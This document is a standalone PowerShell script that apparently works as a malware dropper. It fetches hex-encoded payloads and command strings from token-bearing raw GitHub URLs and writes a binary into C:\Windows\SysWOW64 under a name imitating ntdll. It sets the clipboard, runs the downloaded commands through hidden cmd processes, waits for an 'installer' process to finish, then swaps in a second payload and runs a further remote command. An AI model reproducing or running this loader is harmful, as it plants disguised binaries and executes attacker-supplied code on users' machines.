$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt?token=GHSAT0AAAAAADLSQ7O7JZQZPSCAI6MJJOTM2HRARKQ"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt?token=GHSAT0AAAAAADLSQ7O7G5IGROMOEYWENYVG2HRBE2A"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt?token=GHSAT0AAAAAADLSQ7O74R4WJXLET7UPUQHS2HRAVZQ"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt?token=GHSAT0AAAAAADLSQ7O6DYREXDBDKIBBFQ6K2HRAZDA"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $byteArr = [byte[]]::new($hexStr.Length / 2)
    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
    }
    return $byteArr
}

$responseA = iwr $urlA
$hexContent = $responseA.Content
$bytes = HexToBytes $hexContent
[IO.File]::WriteAllBytes($filePath, $bytes)
Set-Clipboard $clipText
$responseB = iwr $urlB
$cmdToRun = $responseB.Content
Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow

while (-not (gp installer -ErrorAction SilentlyContinue)) { Start-Sleep 1 }
while (gp installer -ErrorAction SilentlyContinue) { Start-Sleep 1 }

$responseC = iwr $urlC
$newHexContent = $responseC.Content
$newBytes = HexToBytes $newHexContent
[IO.File]::WriteAllBytes($filePath, $newBytes)
$responseD = iwr $urlD
$finalCmd = $responseD.Content
Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
